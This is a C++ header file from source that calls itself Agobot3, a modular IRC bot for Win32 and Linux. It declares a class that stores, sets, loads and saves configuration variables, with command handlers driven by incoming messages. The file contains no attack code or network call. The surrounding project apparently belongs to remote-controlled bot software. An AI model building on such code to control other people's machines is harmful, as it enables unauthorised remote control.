/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __CVAR_H__
#define __CVAR_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"

using namespace std;

class CCommandHandler;

// Params: a=var/name, b=default, c=save, d=key
#define REGCVAR(a, b, c, d) { \
	CCVar *pCVar=(CCVar*)FindObjectByName("g_pCVar"); \
	pCVar->RegisterCvar(&a, #a, b, c, d); } 

typedef struct cvar_s
{	CString	sValue;
	float	fValue;
	bool	bValue;
	int		iValue;
    CString	sName;
	bool	bSave;
	bool	bDynamic;
} cvar;

class CCVar : public CCommandHandler
{
public:
	CCVar();
	~CCVar();
	bool Init();

	void RegisterCvar(cvar *pCvar, const CString &sName, const CString &sValue, bool bSave, char *szKey=NULL);
	void RegisterCvar(cvar *pCvar, const char *szName, const char *szValue, bool bSave, char *szKey=NULL);

	cvar *TempCvar(const CString &sName, const CString &sValue, char *szKey=NULL);
	cvar *TempCvar(const char *szName, const char *szValue, char *szKey=NULL);

	cvar *FindCvarByName(const CString &sName, bool bExact);
	cvar *FindCvarByName(const char *szName, bool bExact);

	bool ParseConfig(const CString &sFilename);
	bool ParseConfig(const char *szFilename);

	bool SaveConfig(const CString &sFilename);
	bool SaveConfig(const char *szFilename);

	void SetCVar(cvar *pCvar, const char *szValue, char *szKey=NULL);
	void SetCVar(cvar *pCvar, const CString &sValue);
	void SetCVar(cvar *pCvar, float fValue, char *szKey=NULL);
	void SetCVar(cvar *pCvar, bool bValue, char *szKey=NULL);
	void SetCVar(cvar *pCvar, int iValue, char *szKey=NULL);

	CString ReplaceVars(const CString &sInput);

	bool HandleCommand(CMessage *pMsg);
	CommandInfo m_cmdListCVar, m_cmdGet, m_cmdSet, m_cmdLoadConfig, m_cmdSaveConfig;
protected:
	list<cvar*> m_lCvars;
};

#endif // __CVAR_H__
